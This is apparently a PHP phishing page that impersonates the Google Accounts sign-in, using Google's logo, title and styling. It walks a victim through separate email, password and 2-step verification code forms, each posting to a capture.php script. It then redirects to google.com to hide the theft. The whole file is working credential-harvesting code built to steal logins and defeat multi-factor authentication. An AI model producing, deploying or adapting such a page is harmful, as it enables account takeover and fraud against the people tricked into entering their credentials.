<?php
header("Cache-Control: no-store, no-cache, must-revalidate");
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
$stage = isset($_GET['stage']) ? $_GET['stage'] : 'email';
$email = isset($_GET['email']) ? htmlspecialchars($_GET['email']) : '';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Sign in - Google Accounts</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { width: 75px; margin: 0 auto 16px; display: block; }
        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; color: #202124; }
        .subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 32px; }
        .email-chip { background: #f1f3f4; border-radius: 16px; padding: 4px 8px 4px 4px; display: inline-flex; align-items: center; margin-bottom: 24px; font-size: 14px; }
        input[type="email"], input[type="password"], input[type="text"] {
            width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0;
            border-radius: 4px; margin-bottom: 8px; outline: none;
        }
        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
        .input-label { font-size: 12px; color: #5f6368; margin-bottom: 24px; display: block; }
        .submit-btn {
            background: #1a73e8; color: white; border: none; padding: 10px 24px;
            font-size: 14px; font-weight: 500; cursor: pointer; border-radius: 4px;
            float: right;
        }
        .submit-btn:hover { background: #1557b0; }
        .link { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
        .footer { display: flex; justify-content: space-between; margin-top: 32px; clear: both; padding-top: 24px; }
        .mfa-info { font-size: 14px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
        .mfa-code { letter-spacing: 12px; font-size: 28px; text-align: center; font-weight: 500; }
    </style>
</head>
<body>
<div class="container">
    <svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg"><path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/><path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/><path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/><path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/><path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/></svg>

    <?php if($stage == 'email'): ?>
    <h1>Sign in</h1>
    <p class="subtitle">Use your Google Account</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="email">
        <input type="email" name="email" placeholder="Email or phone" required autofocus>
        <span class="input-label"><a href="#" class="link">Forgot email?</a></span>
        <div class="footer">
            <a href="#" class="link">Create account</a>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'password'): ?>
    <h1>Welcome</h1>
    <div class="email-chip"><?=$email?></div>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="password">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="password" name="password" placeholder="Enter your password" required autofocus>
        <span class="input-label"><a href="#" class="link">Forgot password?</a></span>
        <div class="footer">
            <span></span>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'mfa'): ?>
    <h1>2-Step Verification</h1>
    <p class="mfa-info">Enter the verification code from your phone.</p>
    <form method="POST" action="capture.php">
        <input type="hidden" name="target" value="<?=$destination?>">
        <input type="hidden" name="stage" value="mfa">
        <input type="hidden" name="email" value="<?=$email?>">
        <input type="text" name="mfa_code" class="mfa-code" placeholder="G-" maxlength="6" pattern="[0-9]{6}" required autofocus>
        <span class="input-label"><a href="#" class="link">Try another way</a></span>
        <div class="footer">
            <span></span>
            <button type="submit" class="submit-btn">Next</button>
        </div>
    </form>

    <?php elseif($stage == 'complete'): ?>
    <h1>Verification complete</h1>
    <p class="mfa-info">Redirecting to Google...</p>
    <script>setTimeout(function(){window.location='https://www.google.com';},2000);</script>
    <?php endif; ?>
</div>
</body>
</html>
